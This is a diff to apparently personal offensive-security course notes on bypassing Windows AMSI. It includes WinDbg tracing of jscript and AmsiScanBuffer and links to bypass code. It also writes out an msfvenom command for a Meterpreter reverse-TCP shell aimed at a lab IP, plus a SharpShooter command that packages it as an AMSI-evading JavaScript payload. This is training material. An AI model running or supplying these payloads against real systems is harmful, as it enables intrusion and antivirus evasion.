@@ -502,4 +502,58 @@ $g=$f.SetValue($null,$true)
 
 Create a similar AMSI bypass but instead of modifying the code of _AmsiOpenSession_, find a suitable instruction to change in _AmsiScanBuffer_ and implement it from reflective PowerShell.
 - https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
-- 
+- https://github.com/rogdooley/OSEP-Code-And-Notes/blob/main/Windows/Powershell/ASBB.ps1
+
+
+#### 7.6.2 Is That Your Registry Key
+
+- In Windbg on current Win10 `bu jscript!JAmsi::JAmsiIsEnabledByRegistry` doesn't seem to exist
+	- In Windbg load Wmscript.exe and a malicious js file
+	- set breakpoint `bu jscript!JAmsi::JAmsiIsEnabledByRegistry`
+	- continue to breakpoing `g`
+	- throws error
+	- look in jscript.dll using `lmDvmjscript`
+	- find functions in jscript.dll  that are like jscript!j* using `x /D /f jscript!jA*`
+![](Images/WindbgSearchingForJscriptAMSI.png)
+
+On Win 10 build 17763 (Offsec lab):
+![](Images/WindbgWin10B17763JscriptAmsi.png)
+- this appears to show that JAsmiIsEnabledByRegistry is no longer a function in the jscript.dll
+
+#### Windbg with wscript.exe and a malicious .js
+
+- Start debugging session
+- `bu amsi!AmsiScanBuffer`
+![First hit of AmsiScanBuffer in Windbg](Images/WscriptJsAmsiScanBufferHit.png)
+- look at the next 20 instructions `u rip L20`
+![Next 20 Instructions](Images/WindbgAmsiScanBufferNext20Instructions.png)
+
+
+### Exercise 7.6.2.3
+
+- Experiment with SharpShooter to generate the same type of payload with an AMSI bypass.
+
+- Generate raw shell code
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.210 LPORT=9001 EXITFUNCTION=thread -f raw -o offsec-shell.txt
+```
+
+```bash
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile offsec-shell.txt --payload js --output ch07-offsec-test --amsi amsienable
+
+
+             _____ __                    _____ __                __
+            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
+            \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
+           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
+     SUPER/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
+                              /_/
+
+     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
+     SYANiDE, v3.1 Clinical Precision 
+
+[*] Preview:  var entry_class = 'Shar'+'p'+'S'+'h'+'oot'+'er';
+[*] Written delivery payload to output/ch07-offsec-test.js
+
+```
+- upload and run
